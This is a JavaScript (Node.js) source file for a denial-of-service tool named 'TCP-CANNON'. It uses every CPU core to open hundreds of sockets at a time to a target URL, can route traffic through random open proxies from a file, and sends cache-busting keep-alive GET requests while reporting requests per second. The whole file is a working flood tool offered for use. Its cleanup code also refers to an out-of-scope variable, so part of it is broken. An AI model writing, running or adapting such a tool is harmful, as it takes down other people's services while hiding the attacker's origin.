// R10-2: TCP-CANNON - Raw Socket Flood
// Focus: Bypass HTTP limitations, hit TCP layer
// Technique: Partial packets + Connection saturation

const net = require('net');
const tls = require('tls');
const fs = require('fs');
const cluster = require('cluster');
const os = require('os');

const CPU_CORES = os.cpus().length;
let proxies = [];
let userAgents = [];

// Load proxies and user agents
try {
    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#') && line.includes(':'));
    console.log(`[R10-2] Loaded ${proxies.length} proxies`);
} catch (e) {
    console.log('[R10-2] No proxy.txt found, running without proxies');
}

try {
    userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n')
        .map(line => line.trim())
        .filter(line => line && !line.startsWith('#'));
} catch (e) {}

if (cluster.isMaster) {
    console.log(`[R10-2] TCP-CANNON launching on ${CPU_CORES} cores`);
    for (let i = 0; i < CPU_CORES; i++) cluster.fork();
    
    setTimeout(() => process.exit(0), process.argv[3] * 1000 || 300);
} else {
    const target = process.argv[2];
    const time = process.argv[3] || 300;
    startTCPCannon(target, time);
}

function startTCPCannon(target, time) {
    const parsed = new URL(target);
    const host = parsed.hostname;
    const port = parsed.protocol === 'https:' ? 443 : 80;
    
    let connections = [];
    let requestCount = 0;
    
    const interval = setInterval(() => {
        // Rotate connections
        if (connections.length > 10000) {
            connections.splice(0, 5000).forEach(s => s.destroy());
        }
        
        for (let i = 0; i < 500; i++) {
            try {
                if (proxies.length > 0) {
                    // Use proxy
                    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
                    const [proxyHost, proxyPort] = proxy.split(':');
                    
                    const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
                        socket.write(`CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}:${port}\r\n\r\n`);
                        
                        setTimeout(() => {
                            const ua = userAgents.length > 0 
                                ? userAgents[Math.floor(Math.random() * userAgents.length)]
                                : 'Mozilla/5.0';
                            
                            socket.write(`GET ${parsed.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${ua}\r\nConnection: keep-alive\r\n\r\n`);
                            requestCount++;
                        }, 10);
                    });
                    
                    socket.setTimeout(5000);
                    socket.on('error', () => {});
                    socket.on('timeout', () => socket.destroy());
                    
                    connections.push(socket);
                } else {
                    // Direct connection
                    const socket = net.connect(port, host, () => {
                        const ua = userAgents.length > 0 
                            ? userAgents[Math.floor(Math.random() * userAgents.length)]
                            : 'Mozilla/5.0';
                        
                        socket.write(`GET ${parsed.pathname}?${Math.random()} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${ua}\r\nConnection: keep-alive\r\n\r\n`);
                        requestCount++;
                    });
                    
                    socket.setTimeout(5000);
                    socket.on('error', () => {});
                    socket.on('timeout', () => socket.destroy());
                    
                    connections.push(socket);
                }
                
                // Cleanup old sockets
                setTimeout(() => {
                    const idx = connections.indexOf(socket);
                    if (idx > -1) {
                        connections.splice(idx, 1);
                        socket.destroy();
                    }
                }, 10000);
            } catch (e) {}
        }
    }, 50);
    
    // Show stats
    setInterval(() => {
        console.log(`[R10-2] RPS: ${requestCount} | Connections: ${connections.length}`);
        requestCount = 0;
    }, 1000);
    
    setTimeout(() => {
        clearInterval(interval);
        connections.forEach(s => {
            try { s.destroy(); } catch (e) {}
        });
        process.exit(0);
    }, time * 1000);
}